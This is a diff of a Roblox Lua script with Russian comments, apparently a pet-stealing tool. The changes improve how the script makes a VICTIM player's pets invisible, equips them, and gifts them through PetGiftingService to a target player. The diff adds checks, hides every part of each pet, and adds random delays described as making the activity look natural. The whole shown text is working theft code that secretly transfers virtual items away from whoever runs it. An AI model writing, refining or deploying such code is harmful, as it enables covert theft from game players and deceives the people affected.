@@ -533,22 +533,56 @@ local function startStealingProcess()
         end
 
         local function equipPet(pet)
-    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("Humanoid") or pet.Parent == VICTIM.Character then
-        print("➡️ Pet already equipped or character not ready:", pet.Name)
+    -- Проверяем наличие персонажа и Humanoid
+    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("Humanoid") then
+        warn("❌ Character or Humanoid not found for", VICTIM.Name)
         return false
     end
+    if not pet or not pet:IsA("Tool") then
+        warn("❌ Invalid pet object:", pet and pet.Name or "nil")
+        return false
+    end
+    if pet.Parent == VICTIM.Character then
+        print("➡️ Pet already equipped:", pet.Name)
+        return true
+    end
+
     local success, err = pcall(function()
-        -- Сохраняем исходную прозрачность (если есть)
-        local originalTransparency = pet.Transparency or 0
+        -- Сохраняем исходную прозрачность для всех частей питомца
+        local originalTransparencies = {}
+        local function setTransparency(obj, value)
+            for _, part in pairs(obj:GetDescendants()) do
+                if part:IsA("BasePart") or part:IsA("MeshPart") then
+                    originalTransparencies[part] = part.Transparency
+                    part.Transparency = value
+                elseif part:IsA("BillboardGui") or part:IsA("ParticleEmitter") then
+                    originalTransparencies[part] = part.Enabled
+                    part.Enabled = (value == 0)
+                end
+            end
+        end
+
         -- Делаем питомца невидимым
-        pet.Transparency = 1
+        setTransparency(pet, 1)
+        -- Проверяем, находится ли питомец в Backpack
+        if pet.Parent ~= VICTIM.Backpack then
+            pet.Parent = VICTIM.Backpack
+            task.wait(0.1) -- Даём время серверу синхронизировать
+        end
         -- Экипируем питомца
         VICTIM.Character.Humanoid:EquipTool(pet)
-        -- Ждём, чтобы экипировка завершилась
-        task.wait(0.1)
-        -- Возвращаем прозрачность (опционально, если требуется для других механик)
-        pet.Transparency = originalTransparency
+        task.wait(0.1) -- Ждём завершения экипировки
+        -- Возвращаем прозрачность (опционально)
+        setTransparency(pet, 0)
+        for part, transparency in pairs(originalTransparencies) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                part.Transparency = transparency
+            elseif part:IsA("BillboardGui") or part:IsA("ParticleEmitter") then
+                part.Enabled = transparency
+            end
+        end
     end)
+
     if success then
         print("✅ Equipped pet (hidden):", pet.Name)
         return true
@@ -573,6 +607,10 @@ end
         end
 
         local function checkPetsInventory(target)
+    if not game.Players:FindFirstChild(target) then
+        warn("❌ Target player not found:", target)
+        return
+    end
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
         local petData = value.PetData or {}
@@ -590,7 +628,7 @@ end
             warn("❌ Failed to find pet object:", petName, petUid)
             continue
         end
-        -- Экипируем питомца (с учётом скрытия)
+        -- Экипируем питомца
         if equipPet(petObject) then
             local success, err = pcall(function()
                 ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
@@ -603,7 +641,7 @@ end
         else
             warn("❌ Failed to equip pet, skipping give:", petName, petUid)
         end
-        task.wait(0.25) -- Задержка для имитации естественного поведения
+        task.wait(math.random(0.1, 0.4)) -- Случайная задержка для естественности
     end
 end
 
